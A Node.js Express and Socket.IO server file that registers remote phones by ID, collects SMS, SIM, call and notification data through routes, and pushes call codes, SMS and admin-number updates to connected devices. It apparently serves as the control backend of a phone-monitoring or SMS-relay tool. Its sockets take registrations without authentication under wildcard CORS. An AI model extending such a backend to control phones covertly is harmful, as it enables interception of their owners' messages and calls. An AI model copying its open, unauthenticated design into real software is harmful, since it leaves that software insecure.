// 📁 server.js
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// 🧩 Import routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

// 🌿 Env + DB
dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// ✅ Maintain connected device sockets
const deviceSockets = new Map();

// 🧠 SOCKET.IO Logic
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);
  let currentDeviceId = null;

  // ✅ Register device
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;
    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);
    console.log(`📱 Registered Device: ${uniqueid} → Socket: ${socket.id}`);
    saveLastSeen(uniqueid, "Online");
  });

  // ✅ Device pings
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;
    console.log(`⚡ Status Ping → ${uniqueid}: ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);
    io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
  });

  // ✅ Disconnect
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);
    if (currentDeviceId) {
      console.log(`📴 Device offline: ${currentDeviceId}`);
      deviceSockets.delete(currentDeviceId);
      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
        updatedAt: new Date(),
      });
      saveLastSeen(currentDeviceId, "Offline");
      currentDeviceId = null;
    }
  });
});

async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
    console.log(`🕒 LastSeen Updated → ${deviceId}: ${connectivity}`);
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

// 🔔 Send call code to device
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueid}`);
  } else {
    console.warn(`⚠️ Device ${uniqueid} is offline or not connected.`);
  }
}

// 🧠 MongoDB Change Streams
mongoose.connection.once("open", () => {
  console.log("📡 MongoDB connected — watching CallCode, SMS, AdminNumber...");

  try {
    // --- Watch CallCode ---
    const callStream = mongoose.connection.collection("callcodes").watch();
    callStream.on("change", async (change) => {
      const { operationType, documentKey } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: documentKey._id });

      if (!updatedDoc) return;
      const deviceId = updatedDoc.deviceId;

      console.log(`📞 CallCode Changed (${operationType}) → ${deviceId}`);
      const socketId = deviceSockets.get(deviceId);
      if (socketId) io.to(socketId).emit("callCodeUpdate", updatedDoc);
      else console.warn(`⚠️ ${deviceId} not connected for CallCode`);
    });

    // --- Watch SMS ---
    const smsStream = mongoose.connection.collection("sms").watch();
    smsStream.on("change", async (change) => {
      const { operationType, documentKey } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("sms")
        .findOne({ _id: documentKey._id });

      if (!updatedDoc) return;
      const deviceId = updatedDoc.deviceId;

      console.log(`📩 SMS Changed (${operationType}) → ${deviceId}`);
      const socketId = deviceSockets.get(deviceId);
      if (socketId) io.to(socketId).emit("smsUpdate", updatedDoc);
      else console.warn(`⚠️ ${deviceId} not connected for SMS`);
    });

    // --- Watch AdminNumber ---
    const adminStream = mongoose.connection.collection("adminnumbers").watch();
    adminStream.on("change", async (change) => {
      const { operationType, documentKey } = change;
      if (!["insert", "update", "replace"].includes(operationType)) return;

      const updatedDoc = await mongoose.connection
        .collection("adminnumbers")
        .findOne({ _id: documentKey._id });

      if (!updatedDoc) return;

      console.log("👑 Admin Number Changed:", updatedDoc);
      // Broadcast admin change to all connected devices
      io.emit("adminUpdate", updatedDoc);
      console.log("✅ [EMIT] adminUpdate → All devices");
    });

    // Error handlers
    callStream.on("error", (err) => console.error("🚨 CallCode Stream Error:", err));
    smsStream.on("error", (err) => console.error("🚨 SMS Stream Error:", err));
    adminStream.on("error", (err) => console.error("🚨 Admin Stream Error:", err));
  } catch (err) {
    console.error("❌ Failed to create change streams:", err);
  }
});

// 🏠 Base Route
app.get("/", (req, res) => {
  res.send("🚀 Live Socket + MongoDB Streams (CallCode, SMS, Admin) running!");
});

// 🧭 Routes
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);

// ❌ 404 + Error
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);
app.use((err, req, res, next) => {
  console.error("💥 Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`✅ Server running on http://localhost:${PORT}`));
